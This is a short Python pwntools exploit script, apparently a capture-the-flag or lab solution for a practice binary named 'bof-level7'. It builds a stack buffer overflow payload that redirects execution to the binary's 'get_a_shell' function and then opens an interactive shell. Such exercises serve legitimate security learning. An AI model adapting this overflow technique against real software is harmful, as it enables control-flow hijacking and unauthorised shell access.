#!/usr/bin/env python

from pwn import *


env = {
    'ENVV' : 'a'*155,
        }
context.terminal = "/bin/bash"
buf = 'A' * 80 + "\x00"

c = Core('./core')
buffer_addr = c.stack.find(buf)

e = ELF("./bof-level7")
addr_get_a_shell = e.symbols['get_a_shell']

buf = "RRRR" + p32(addr_get_a_shell)

buf = buf + "C" * (0x80 - len(buf)) + "\x20"

p = process('./bof-level7', env=env)
#gdb.attach(p)
p.send(buf)
p.interactive()
